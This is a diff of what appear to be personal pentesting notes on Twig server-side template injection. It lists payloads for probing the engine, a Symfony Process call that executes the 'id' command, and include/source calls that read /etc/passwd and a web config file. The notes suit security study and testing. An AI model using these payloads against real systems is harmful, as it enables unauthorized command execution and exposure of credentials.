@@ -1,12 +1,12 @@
 #php 
-
+[[SSTI Templates engines]]
 
 ```twig
- constant('PHP_VERSION')
+{{ constant('PHP_VERSION') }}
 ```
 
 ```twig
-dump()
+{{ dump() }}
 ```
 
 ##### functions
@@ -29,12 +29,12 @@ if dump doesnt work
 ```
 
 check if we have access to symphony classes
-```
+```twig
 {{ constant('Symfony\\Component\\Process\\Process')(['id']) }}
 ```
 
 #### LFI
-```
+```twig
 {{ include('/etc/passwd') }}  
 {{ source('/var/www/html/config.php') }}
 ```
